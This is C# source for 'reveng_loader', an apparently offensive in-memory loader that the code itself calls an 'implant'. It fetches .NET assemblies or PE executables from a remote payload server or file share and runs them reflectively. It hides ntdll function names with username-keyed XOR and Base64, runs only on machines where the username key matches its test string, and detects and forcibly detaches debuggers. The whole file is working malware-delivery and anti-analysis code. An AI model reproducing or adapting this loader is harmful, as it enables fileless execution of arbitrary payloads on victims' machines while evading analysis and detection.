using System;
using System.Reflection;                                // For loading .NET assembly in-memory
using System.Net;                                       // For usage of WebClient, to receive or send data
using System.Threading;                                 // For threading implementation
using System.Text;                                      // For string implmentation
using System.Collections.Generic;                       // For Dictionary Usage
using System.Security.Cryptography;                     // For cryptographic implementation
using System.Security.Principal;                        // For checking (admin. priv of trgt, username of trgt)
using System.Runtime.InteropServices;   // For PInvoke
using System.IO;                        // For memorystream and file operation
using System.Diagnostics;              // For getting the process component of the currently active process


namespace reveng_loader
{
	public class Program
	{
        #region PInvoke

		// =============================================== Attached Debugger Detection: Flags and Functions ========================================

		// link: https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr ExitStatus;
			public IntPtr PebAddress;
			public IntPtr AffinityMask;
			public IntPtr BasePriority;
			public IntPtr UniquePID;
			public IntPtr InheritedFromUniqueProcessId;
		}

		// link: https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
		// This above given documentation doesn't contain all enum members of PROCESSINFOCLASS.
		// visit: http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html      => It has other ones
		[Flags]
		public enum PROCESSINFOCLASS
		{
			ProcessBasicInformation = 0x00,     // link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view | source: https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
			ProcessDebugPort = 0x07,
			ProcessExceptionPort = 0x08,
			ProcessAccessToken = 0x09,
			ProcessWow64Information = 0x1A,
			ProcessImageFileName = 0x1B,
			ProcessDebugObjectHandle = 0x1E,
			ProcessDebugFlags = 0x1F,
			ProcessExecuteFlags = 0x22,
			ProcessInstrumentationCallback = 0x28,
			MaxProcessInfoClass = 0x64
		}

		/*
		[DllImport("kernel32.dll")]
		public static extern bool IsDebuggerPresent();
		*/

		/*
		// For checking presence of debugger
		// PInvoke
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
		IntPtr processHandle, 
		int processInformationClass, 
		IntPtr processInformation, 
		uint processInformationLength, 
		ref uint returnLength // IntPtr
		);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Int32 NtQIP(
		IntPtr processHandle,
		int processInformationClass,
		IntPtr processInformation,
		uint processInformationLength,
		ref uint returnLength // IntPtr
		);

		// Performing Function Overloading


		// For detaching debugger from current process
		// We will need debugger handle
		// PInvoke
		/*
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
		IntPtr processHandle, 
		int processInformationClass, 
		ref IntPtr processInformation, // Changed to: ref 
		uint processInformationLength, 
		ref uint returnLength // IntPtr
		);
		*/

		// With delegate function Overloading was not happening so I Changed function names

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Int32 NtQIP2(
		IntPtr processHandle,
		int processInformationClass,
		ref IntPtr processInformation, // Changed to: ref 
		uint processInformationLength,
		ref uint returnLength // IntPtr
		);

		/*
		// link: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html
		// For detaching debugger from current process
		// PInvoke
		[DllImport("ntdll.dll")]
		public static extern int NtRemoveProcessDebug(
		IntPtr ProcessHandle,
		IntPtr DebugObjectHandle
		);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Int32 NtRPD(
		IntPtr ProcessHandle,
		IntPtr DebugObjectHandle
		);

		#endregion PInvoke


		#region: Start: Decrypting XOR
		public static byte[] XOR_B64_Decrypt(string cipher)
		{
			// username: {hostname}\{username}
			string username = WindowsIdentity.GetCurrent().Name;
			// xor_key: username
			string[] xor_key = username.Split('\\');
			byte[] xor_key_byte = Encoding.UTF8.GetBytes(xor_key[1]);

			//Console.WriteLine("xorkey: "+xor_key[1]);

			// b64 decrypt
			byte[] xored = Convert.FromBase64String(cipher);

			byte[] unxored = new byte[xored.Length];

			for (int i = 0; i < xored.Length; i++)
			{
				unxored[i] = (byte)(xored[i] ^ xor_key_byte[i % xor_key_byte.Length]);
			}

			return unxored;
		}
		#endregion: End: Decrypting XOR

		public class Worker : MarshalByRefObject
		{
	#region Start: LOADER OPERATIONS 

		#region Start: Actual Web Reflection

			public byte[] WebReflect(string url, int retrycount, int timeoutTimer)
			{
				// Dealing with HTTPS requests
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				// Creating a Web Client to make web requests
				WebClient client = new WebClient();
				// Downloading byte array from the provided link via client web request.
				byte[] programBytes = null;

				int index = url.LastIndexOf("/");
				string trgtFile = url.Substring(index + 1);

				while (retrycount >= 0 && programBytes == null)
				{
					try
					{
						programBytes = client.DownloadData(url);
					}
					/* Unable to download assembly from url or if url server address is down, WebException is raised
					link: https://docs.microsoft.com/en-us/dotnet/api/system.net.webexception.response?view=net-5.0
					*/

					catch (WebException) //ex)
					{
						Console.Write("\n[!] '{0}' not found yet: [Exception raised!]\t=>\t[!] Please add '{0}' file in the Payload Server\t=>\t", trgtFile);

						retrycount--;

						Console.Write("[*] Sleeping for {0} seconds and retrying another {1} time...", timeoutTimer, retrycount); //, ex);
						Thread.Sleep(timeoutTimer * 1000);
					}
				}
				// If for some reason, assembly doesn't exist in the url, loader gracefully exits
				if (programBytes == null)
				{
					Console.WriteLine("\n\n[-] '{0}' was not found, exiting now...", trgtFile);
					Environment.Exit(-1);
				}
				return programBytes;
			}

		#endregion Start: Actual Web Reflection

		#region Start: DotNet in-memory Loading

			#region Start: DotNet in-memory Loading from URL

			// Loading dotNet (from URL) from EntryPoint:
			public static void StartFromUrl(byte[] programBytes)
			{
				// Loading the assembly from byte array that was downloaded.
				Assembly dotNetProgram = Assembly.Load(programBytes);		// COM method
				// Creates a new Object Array containing a new (empty) String Array
				Object[] parameters = new String[] { null };
				// Executes the entry point of the loaded assembly
				dotNetProgram.EntryPoint.Invoke(null, parameters);          // COM method 
			}

			// LOADER: Loading dotNet from URL:
			public static void dotNetLoadFromUrl(string url, int AppDomainName)
			{
				CheckDebugger();

				Console.WriteLine("==================================================================");

				AppDomain appdomain = AppDomain.CreateDomain(AppDomainName.ToString());
				Console.WriteLine("[+] Appdomain {0} Created!", AppDomainName);

				Worker remoteWorker = (Worker)appdomain.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

				Console.WriteLine("[>] {0} is reflectively loaded from: {1}\n", url.Substring(url.LastIndexOf('/') + 1), url);

				byte[] programBytes1 = remoteWorker.WebReflect(url, 0, 0);
				StartFromUrl(programBytes1);

				Console.WriteLine("[+] Appdomain {0} Destroyed!", AppDomainName);
				AppDomain.Unload(appdomain);
				Console.WriteLine("==================================================================\n");
				//Console.ReadKey();
			}

			#endregion End: DotNet in-memory Loading from URL

			#region Start: DotNet in-memory Loading from FilePath/ FileShare

			// Loading dotNet (from FilePath) from EntryPoint:
			public static void StartFromFilePath(string filepath)
			{
				//Assembly dotNetProgram = Assembly.LoadFile(filepath);

				// Loads an assembly into the load-from context, bypassing some security checks
				Assembly dotNetProgram = Assembly.UnsafeLoadFrom(filepath);

				// Creates a new Object Array containing a new (empty) String Array
				Object[] parameters = new String[] { null };
				// Executes the entry point of the loaded assembly
				dotNetProgram.EntryPoint.Invoke(null, parameters);
			}

			// LOADER: Loading dotNet from FilePath:
			public static void dotNetLoadFromFilePath(string filepath, int AppDomainName)
			{
				CheckDebugger();

				Console.WriteLine("==================================================================");

				AppDomain appdomain = AppDomain.CreateDomain(AppDomainName.ToString());
				Console.WriteLine("[+] Appdomain {0} created!", AppDomainName);

				Worker remoteWorker = (Worker)appdomain.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

				Console.WriteLine("[>] {0} is reflectively loaded from: {1}\n", filepath.Substring(filepath.LastIndexOf('\\') + 1), filepath);

				//StartFromFilePath(@"filepath");
				StartFromFilePath(filepath);

				Console.WriteLine("[+] Appdomain {0} Destroyed!", AppDomainName);
				AppDomain.Unload(appdomain);
				Console.WriteLine("==================================================================\n");
				//Console.ReadKey();
			}

			#endregion End: DotNet in-memory Loading from FilePath/ FileShare

		#endregion End: DotNet in-memory Loading

		#region Start: PE in-memory Loading

			#region Start: PE in-memory Loading from URL

			// LOADER: Loading PE from FilePath:
			public static void PELoadFromUrl(string url, int AppDomainName)
			{
				CheckDebugger();

				Console.WriteLine("==================================================================");

				AppDomain appdomain = AppDomain.CreateDomain(AppDomainName.ToString());
				Console.WriteLine("[+] Appdomain {0} Created!", AppDomainName);

				Worker remoteWorker = (Worker)appdomain.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

				Console.WriteLine("[>] {0} is reflectively loaded from: {1}\n", url.Substring(url.LastIndexOf('/') + 1), url);

				byte[] rawfile = remoteWorker.WebReflect(url, 0, 0);

				//Console.WriteLine("334");

				PELoader.Program.LoadPE(rawfile, url);

				Console.WriteLine("[+] Appdomain {0} Destroyed!", AppDomainName);
				AppDomain.Unload(appdomain);
				Console.WriteLine("==================================================================\n");
				//Console.ReadKey();
			}

			#endregion End: PE in-memory Loading from URL

			#region Start: PE in-memory Loading from FilePath/ FileShare

			// LOADER: Loading PE from FilePath:
			public static void PELoadFromFilePath(string filepath, int AppDomainName)
            {
                CheckDebugger();

                Console.WriteLine("==================================================================");

                AppDomain appdomain = AppDomain.CreateDomain(AppDomainName.ToString());
                Console.WriteLine("[+] Appdomain {0} created!", AppDomainName);

                Worker remoteWorker = (Worker)appdomain.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

                Console.WriteLine("[>] {0} is reflectively loaded from: {1}\n", filepath.Substring(filepath.LastIndexOf('\\') + 1), filepath);

				byte[] rawfile = File.ReadAllBytes(filepath);

				//Console.WriteLine("334");

				PELoader.Program.LoadPE(rawfile, filepath);

                Console.WriteLine("[+] Appdomain {0} Destroyed!", AppDomainName);
                AppDomain.Unload(appdomain);
                Console.WriteLine("==================================================================\n");
                //Console.ReadKey();
            }

			#endregion End: PE in-memory Loading from FilePath/ FileShare

		#endregion End: PE in-memory Loading

	#endregion End: LOADER OPERATIONS

	#region Start: Banner
			public static void color()
			{
				CheckDebugger();

				ConsoleColor foreground = Console.ForegroundColor;
				Console.ForegroundColor = ConsoleColor.Green;
			}

			// Main Menu:
			public static void Banner()
			{
				CheckDebugger();

				color();
				Console.WriteLine("\n[>] All possible ways of usage: ");
				Console.ResetColor();
				Console.Write("---------------------------------------------------\n1.");

				color();
				Console.Write("To load dotnet binaries:");
				Console.ResetColor();
				Console.Write(" 'reveng_loader.exe /dotnet:<ip/url/folder_path/fileshare_path> /xor_key:<usernameoftarget>'\n2.");

				color();
				Console.Write("To load c/c++ PE binaries:");
				Console.ResetColor();
				Console.Write(" 'reveng_loader.exe /pe:<ip/url/folder_path/fileshare_path> /xor_key:<usernameoftarget>'\n3.");

				color();
				Console.Write("To load more than 1 dotnet binaries (execution order => Left to right):\n");
				Console.ResetColor();
				Console.Write("'reveng_loader.exe /dotnet:<ip/url/folder_path/fileshare_path> /dotnet:<ip/folder_path/fileshare_path> ... /xor_key:<usernameoftarget>'\n\n5.");

				color();
				Console.Write("If c/c++ PE binary is needed to load with dotnet files (execution order => Left to right):\n");
				Console.ResetColor();
				Console.WriteLine("'reveng_loader.exe /dotnet:<ip/url/folder_path/fileshare_path> /pe:<ip/folder_path/fileshare_path> /xor_key:<usernameoftarget>'\n");

				color();
				Console.WriteLine("[>] All these options can be mangled together too!");
				Console.ResetColor();
				Console.WriteLine("---------------------------------------------------\n");

				//string serialnum = Console.ReadLine();
			}
	#endregion End: Banner

	#region Start: Administrator Or Not!
			public static bool IsAdministrator()
			{
				using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
				{
					WindowsPrincipal principal = new WindowsPrincipal(identity);
					return principal.IsInRole(WindowsBuiltInRole.Administrator);
				}
			}
	#endregion End: Administrator Or Not!

	#region Start: CheckDebugger
			public static void CheckDebugger()
			{
				/*
				if (IsDebuggerPresent())
				{
					Console.WriteLine("\n[!] Status: Implant is attached to a Debugger: {0}\n", IsDebuggerPresent());
					System.Environment.Exit(1);
				}
				*/

				// ProcessBasicInformation: In processInformationClass, https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess

				IntPtr phandle = Process.GetCurrentProcess().Handle;

				// http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html
				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb


				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.sizeof?view=net-6.0
				// Returns the unmanaged size of an object in bytes
				uint processInformationLength = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));


				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=net-6.0#system-runtime-interopservices-marshal-allochglobal(system-int32)
				// public static IntPtr AllocHGlobal (int cb);
				// Input parameter, cb = The required number of bytes in memory

				//      cb != processInformationLength
				// or,  cb != (uint)Marshal.SizeOf(typeof(ProcessBasicInformation))
				// cb == Marshal.SizeOf(typeof(ProcessBasicInformation));

				// as the number required by cb should be in bytes.

				IntPtr processInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

				uint returnLength = 0;

				/*
				// PInvoke
				NtQueryInformationProcess(
				phandle,
				0,
				processInformation,         // -> [out]     =>  returns processInformation
				processInformationLength,
				ref returnLength
				);
				*/

				// delegate
				//IntPtr funcaddr7 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

				string nt = "JiQsPCQ="; // Xor-Base64(ntdll)
				string ntq = "BiQZJS0iMRkmNiciJTE8OSc+GCInMy0jOw=="; // Xor-Base64(NtQueryInformationProcess)

				IntPtr funcaddr7 = PELoader.Program.GetProcAddress(PELoader.Program.LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(nt))), Encoding.UTF8.GetString(XOR_B64_Decrypt(ntq)));
				NtQIP ntqip = (NtQIP)Marshal.GetDelegateForFunctionPointer(funcaddr7, typeof(NtQIP));

				ntqip(
				phandle,
				0,
				processInformation,         // -> [out]     =>  returns processInformation
				processInformationLength,
				ref returnLength
				);


				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=net-6.0#system-runtime-interopservices-marshal-ptrtostructure(system-intptr-system-type)

				// link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view
				// returns: object type -> needs typecasting
				PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(PROCESS_BASIC_INFORMATION));

				// Getting the base address of the PEB structure of our current process
				// According to https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb:
				// Baseaddress of PEB + 2 byte (RVA) = Absolute address of the BeingDebugged member of the PEB structure

				// Getting base address of PEB
				IntPtr Pebptr = pbi.PebAddress;

				// Getting absolute address of BeingDebugged member of the PEB structure
				// link: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.readbyte?view=net-6.0#system-runtime-interopservices-marshal-readbyte(system-intptr)
				byte check = Marshal.ReadByte(Pebptr + 2);

				if (check.Equals(1))
				{
					Console.Write("\n[!] Status: Implant is attached to a Debugger\t");

					//Detaching our implant from attached debugger
					// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html


					// https://stackoverflow.com/questions/1456861/is-intptr-zero-equivalent-to-null
					IntPtr debuggerhandle = IntPtr.Zero;

					uint outlength = 0;

					/*
					// PInvoke
					NtQueryInformationProcess(
					phandle,
					0x1e,               // ProcessDebugObjectHandle = 0x1E
					ref debuggerhandle,
					8,          // 64bit => 8byte
					ref outlength
					);
					*/

					// delegate
					//IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

					IntPtr funcaddr8 = PELoader.Program.GetProcAddress(PELoader.Program.LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(nt))), Encoding.UTF8.GetString(XOR_B64_Decrypt(ntq)));
					NtQIP2 ntqip2 = (NtQIP2)Marshal.GetDelegateForFunctionPointer(funcaddr8, typeof(NtQIP2));

					ntqip2(
					phandle,
					0x1e,               // ProcessDebugObjectHandle = 0x1E
					ref debuggerhandle,
					8,          // 64bit => 8byte
					ref outlength
					);


					Console.WriteLine("-> Debug handle: {0}", debuggerhandle);

					Console.Write("[*] Trying to detach Debugger : ");
					//calling NtRemoveProcessDebug for Detaching debugger from implant process
					// PInvoke
					//int status = NtRemoveProcessDebug(phandle, debuggerhandle);

					// delegate
					//IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");

					string str_ntrpd = "BiQaNSU/PjUYIiczLSM7FC0yPTc="; // Xor-Base64(NtRemoveProcessDebug)

					IntPtr funcaddr9 = PELoader.Program.GetProcAddress(PELoader.Program.LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(nt))), Encoding.UTF8.GetString(XOR_B64_Decrypt(str_ntrpd)));
					NtRPD ntrpd = (NtRPD)Marshal.GetDelegateForFunctionPointer(funcaddr9, typeof(NtRPD));

					int status = ntrpd(phandle, debuggerhandle);

					if (status == 0)
					{
						Console.WriteLine("[DONE!]");
					}
					else
					{
						Console.WriteLine("[Oops! Unable to detach...]");
					}
				}
			}
	#endregion End: CheckDebugger

	#region Start: Checking whether target machine is intended target machine or not
			public static void CheckTarget()
			{
				// Using just testing string to perform the checking of xor key,
				// Whether xorkey(username) used by dropper is same as xorkey that 
				// Operator used while making the test string encrypted.
				string testontarget = "PDU7JCc+PDE6Ny0k"; // Xor-Base64(testontarget)  

				string decoded = Encoding.UTF8.GetString(XOR_B64_Decrypt(testontarget));

				// Not matching
				if (!String.Equals(decoded, "testontarget"))
				{
					Console.WriteLine("\n[!] Not a valid Target!\tStopping Execution of reveng_loader...");
					System.Environment.Exit(1);
				}
				else
				{
					Console.WriteLine("\n[+] Valid Target Test: [Successfully Passed]\n[*] Starting execution of reveng_loader...");
				}
			}
	#endregion End: Checking whether target machine is intended target machine or not


			public static int AppDomainName = 1;

			static void Main(string[] args)
			{
				// Checking whether target windows machine is intended target or out of scope/engagement
				CheckTarget();

				Console.ReadKey();

				// Need of: using System.DirectoryServices.AccountManagement;
				//string sid = UserPrincipal.Current.Sid.ToString();
				//Console.WriteLine("SID: {0}", sid);

				bool check = IsAdministrator();
				if (check.Equals("true"))
				{
					Console.WriteLine("\n[+] Current Process is Admininstrator!");
					Console.ReadKey();
				}
				else
				{
					Console.WriteLine("\n[+] Current Process is Not Admininstrator => Privilege Escalation is needed!");
					Console.ReadKey();
				}

				CheckDebugger();

				//var data type: tells the compiler to figure out the type of the variable at compilation time
				var arguments = new Dictionary<string, string>();

				string last_3_chars = "";                           // To store input file extension

				Console.Write("\n");

				// Lists:
				List<string> filelist = new List<string>();

				foreach (var argument in args)
				{
					var id = argument.IndexOf(':');
					//Console.WriteLine($"id: {id}");	// 5
					if (id > 0)
					{
						// key
						string prefix = argument.Substring(0, id);
						// value
						string postfix = argument.Substring(id + 1);

						// assigning value to key
						// key <= value
						arguments[prefix] = postfix;

						Console.WriteLine("[+] Key:Value = {0}:{1}", prefix, arguments[prefix]);

						// Storing input values
						if ((arguments.ContainsKey("/dotnet") && arguments["/dotnet"] == postfix))
						{
							last_3_chars = arguments["/dotnet"].Substring(arguments["/dotnet"].Length - 3);
							filelist.Add(prefix + arguments[prefix]);
						}
						else if ((arguments.ContainsKey("/pe") && arguments["/pe"] == postfix))
						{
							last_3_chars = arguments["/pe"].Substring(arguments["/pe"].Length - 3);
							filelist.Add(prefix + arguments[prefix]);
						}
						else if ((arguments.ContainsKey("/xor_key") && arguments["/xor_key"] == postfix))
						{
							//pass
						}
					}
					else
					{
						arguments[argument] = string.Empty;
					}
				}
				if (arguments.Count == 0 || !arguments.ContainsKey("/xor_key"))
				{
					Console.WriteLine("\n[!] Please enter /xor_key as argument");

					if (!arguments.ContainsKey("/dotnet") && !arguments.ContainsKey("/pe") && !arguments.ContainsKey("/ps"))
					{
						Console.WriteLine("[!] Please enter /dotnet: or, /pe: or, a mix of all of them as arguments");
						Banner();
					}

				}
				else if (string.IsNullOrEmpty(arguments["/xor_key"]))
				{
					Console.WriteLine("\n[!] Empty /xor_key");

					if (((string.IsNullOrEmpty(arguments["/dotnet"])) || (string.IsNullOrEmpty(arguments["/pe"]))))
					{
						Console.WriteLine("\n[!] dotnet or pe parameters are empty");
						Banner();
					}
				}
				// Checking last 3 characters of corresponding Value of a Key
				else if (last_3_chars != "exe")
				{
					Console.WriteLine("\n[!] Invalid file type, Only .exe is accepted: {0}", last_3_chars);
					Banner();
				}

			#region Start: Load files

				Console.Write("\n");
				String[] Paths = filelist.ToArray();

				int AppDomainName = 1;

				foreach (var Path in Paths)
				{

					#region Start: dotNetLoad

					if ((Path.Substring(0, 7)).Equals("/dotnet"))
					{
						int startIndex = 7;
						int endIndex = Path.Length - startIndex;

						string file = Path.Substring(startIndex, endIndex);
						Console.WriteLine("Path: {0}", file);

						// Loading From URL

						if ((file.Substring(0, 8) == "https://") || (file.Substring(0, 7) == "http://"))
						{
							Console.WriteLine("\n[*] LOADER Loading dotnet from Remote URL: ");
							dotNetLoadFromUrl(file, AppDomainName);
							AppDomainName++;
						}

						// Loading From FilePath

						else if ((file.Substring(0, 8) != "https://") || (file.Substring(0, 7) != "http://"))
						{
							Console.WriteLine("\n[*] LOADER Loading dotnet from Remote FilePath: ");
							dotNetLoadFromFilePath(file, AppDomainName);
							AppDomainName++;
						}
					}
					#endregion Start: dotNetLoad

					#region Start: PELoad

					else if ((Path.Substring(0, 3)).Equals("/pe"))
					{
						int startIndex = 3;
						int endIndex = Path.Length - startIndex;

						string file = Path.Substring(startIndex, endIndex);
						Console.WriteLine("Path: {0}", file);

						// Loading From URL

						if ((file.Substring(0, 8) == "https://") || (file.Substring(0, 7) == "http://"))
						{
							Console.WriteLine("\n[*] LOADER Loading PE from Remote URL: ");
							PELoadFromUrl(file, AppDomainName);
							AppDomainName++;
						}

						// Loading From FilePath

						else if ((file.Substring(0, 8) != "https://") || (file.Substring(0, 7) != "http://"))
						{
							Console.WriteLine("\n[*] LOADER Loading PE from Remote FilePath: ");
							PELoadFromFilePath(file, AppDomainName);
							AppDomainName++;
						}
					}
					#endregion Start: PELoad
				}
			#endregion End: Load files
			}
		}
	}
}
